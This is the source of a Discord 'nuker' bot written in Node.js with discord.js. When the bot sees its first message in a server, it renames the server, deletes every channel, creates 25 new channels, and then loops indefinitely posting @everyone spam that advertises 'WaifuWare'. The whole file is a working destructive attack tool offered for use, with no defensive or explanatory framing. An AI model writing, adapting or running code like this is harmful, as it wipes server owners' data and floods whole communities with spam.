const { Client, Events, GatewayIntentBits, TextChannel } = require('discord.js');
const { token } = require('./config.json');

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });

client.once(Events.ClientReady, c => {
	console.log(`Ready! Logged in as ${c.user.tag}`);
});

let started = false
client.on('messageCreate', message => {
    if(started) return;
    started = true
    console.log("[+] Lets get right into it.")

    const guild =  client.guilds.cache.get(message.guildId);

    message.guild.setName(`${'Nuked by WaifuWare (dont be a ratter)'}`);

    guild.channels.cache.forEach((ch) => ch.delete())

    for(let i = 0; i < 25; i++){
        guild.channels.create({name:'WaifuWare on top'}, { type: "GUILD_TEXT" }).catch((err) => { 
            console.log(("Error Found: " + err)) 
        }).then((ch) => {
            if(i >= 24)
            {
                console.log("[+] Let's make some noise")
                startSpam(guild)
            }
        });
    }
})

const delay = ms => new Promise(res => setTimeout(res, ms));
let spam = 0;
/**
 * 
 * @param {Guild} guild 
 */
 const startSpam = async (guild) => 
{
    await delay(500);
    guild.channels.cache.forEach((ch) => { spam++; console.log(`[+] message sent ! amount of spam created : ${spam}`); ch.send ("@everyone this discord was nuked using WaifuWare nuker https://github.com/WaifuWare/Minecraft-Stealer-PSA don't be a ratter and everything will be fine.")})
    startSpam(guild)
}

// Log in to Discord with your client's token
client.login(token);